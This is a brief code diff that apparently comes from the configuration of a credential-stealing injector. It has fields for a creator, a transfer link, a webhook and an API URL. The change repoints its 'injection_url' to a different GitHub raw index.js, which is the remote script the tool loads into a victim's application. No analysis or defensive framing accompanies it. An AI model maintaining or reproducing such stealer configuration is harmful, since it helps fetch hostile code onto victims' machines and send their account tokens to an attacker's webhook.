@@ -23,7 +23,7 @@ var config = {
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/hawkish-teams/cerf/main/index.js",
+    "https://raw.githubusercontent.com/selfbot12345/sub/main/index.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
